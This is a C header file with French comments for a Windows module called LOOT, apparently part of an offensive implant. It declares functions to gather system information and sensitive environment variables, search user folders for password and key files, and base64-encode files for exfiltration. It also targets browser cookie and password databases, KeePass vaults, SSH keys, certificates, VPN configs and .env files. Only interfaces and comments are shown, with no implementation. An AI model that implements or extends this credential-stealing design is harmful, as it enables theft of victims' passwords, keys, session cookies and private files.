#ifndef LOOT_H
#define LOOT_H

#include <windows.h>

/**
 * Module LOOT - Exfiltration de données sensibles
 * Recherche et collecte de fichiers intéressants
 */

// Codes de retour
#define LOOT_SUCCESS 0
#define LOOT_ERROR_ACCESS_DENIED 1
#define LOOT_ERROR_NOT_FOUND 2
#define LOOT_ERROR_TOO_LARGE 3
#define LOOT_ERROR_ENCODING 4

/**
 * Collecte des informations système avancées
 *
 * Récupère :
 * - Liste des processus en cours
 * - Utilisateurs locaux
 * - Logiciels installés
 * - Variables d'environnement sensibles
 *
 * @param output Buffer pour stocker le résultat
 * @param size Taille du buffer
 * @return LOOT_SUCCESS ou code d'erreur
 */
int loot_sysinfo(char *output, size_t size);

/**
 * Recherche de fichiers par pattern
 *
 * Cherche des fichiers dans les répertoires communs :
 * - Desktop, Documents, Downloads
 * - AppData
 * - C:\
 *
 * Exemples de patterns :
 * - "*.txt" : tous les fichiers texte
 * - "password*" : fichiers commençant par password
 * - "*.key" : fichiers de clés
 *
 * @param pattern Pattern de recherche (wildcards * et ?)
 * @param output Buffer pour stocker les chemins trouvés
 * @param size Taille du buffer
 * @return LOOT_SUCCESS ou code d'erreur
 */
int loot_find(const char *pattern, char *output, size_t size);

/**
 * Exfiltre un fichier spécifique (encodé en base64)
 *
 * Lit le fichier et l'encode en base64 pour transmission
 * Limite : 1 MB par fichier
 *
 * @param filepath Chemin complet du fichier à exfiltrer
 * @param output Buffer pour stocker le contenu encodé
 * @param size Taille du buffer
 * @return LOOT_SUCCESS ou code d'erreur
 */
int loot_grab(const char *filepath, char *output, size_t size);

/**
 * Tente de récupérer les cookies/passwords des navigateurs
 *
 * Cible :
 * - Chrome (cookies, saved passwords)
 * - Firefox (cookies, logins)
 * - Edge (cookies)
 *
 * @param output Buffer pour stocker les chemins des DB trouvées
 * @param size Taille du buffer
 * @return LOOT_SUCCESS ou code d'erreur
 */
int loot_browser(char *output, size_t size);

/**
 * Recherche de fichiers sensibles connus
 *
 * Cible spécifiquement :
 * - KeePass databases (.kdbx, .kdb)
 * - Clés SSH (id_rsa, id_ed25519, id_ecdsa, *.ppk)
 * - Certificats et clés privées (.pem, .pfx, .p12)
 * - Configs VPN (.ovpn)
 * - Fichiers d'environnement et de config (.env, web.config, ...)
 *
 * @param output Buffer pour stocker les chemins trouvés
 * @param size Taille du buffer
 * @return LOOT_SUCCESS ou code d'erreur
 */
int loot_sensitive(char *output, size_t size);

#endif // LOOT_H
